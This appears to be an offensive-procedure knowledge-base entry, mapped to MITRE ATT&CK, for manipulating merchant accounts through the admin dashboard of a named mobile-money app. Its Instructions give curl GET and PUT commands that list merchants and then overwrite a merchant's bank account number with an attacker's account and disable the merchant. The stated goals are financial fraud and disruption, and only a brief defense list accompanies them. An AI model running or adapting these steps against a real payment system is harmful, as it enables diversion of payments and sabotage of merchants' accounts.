---
id: proc-mtn-manipulate-merchants-001
tags:
  - data-manipulation
  - financial-fraud
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:35.304Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manipulate Merchant Accounts

## Summary

This procedure accesses the merchant management section of the admin dashboard to view, edit, disable, or delete merchant accounts, including sensitive financial details like account numbers.

## Description

From the admin dashboard, the endpoint for merchant lists allows full CRUD operations without additional checks, enabling attackers to alter credentials or redirect payments by changing bank details. This targets the web-based financial services in the MTN Group app.

## Requirements

1. Active admin session
2. Dashboard access
3. Knowledge of merchant endpoint (e.g., /admin/merchants)

## Defense

Defensive measures and detection strategies:

- Audit logs for admin actions on merchant data
- Require secondary approval for financial changes
- Encrypt sensitive fields like account numbers

## Objectives

1. Retrieve list of merchant accounts
2. Modify financial or credential data
3. Disable or delete accounts for disruption

## Instructions

### Step 1: Access Merchant List

**Context**: GET the merchant endpoint to load the list.

Example using curl:

```bash
curl -X GET https://target-app.com/admin/merchants \
  -H "Authorization: Bearer <session_token>"
```

> Expected output: JSON array of merchant records with details.

### Step 2: Edit Merchant Data

**Context**: Select a merchant and send a PUT request to update fields like account_number.

Example:

```bash
curl -X PUT https://target-app.com/admin/merchants/123 \
  -H "Authorization: Bearer <session_token>" \
  -H "Content-Type: application/json" \
  -d '{"account_number":"attacker_bank_123","status":"disabled"}'
```

> Expected output: 200 OK with updated record.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[financial-fraud]]
- [[data-manipulation]]
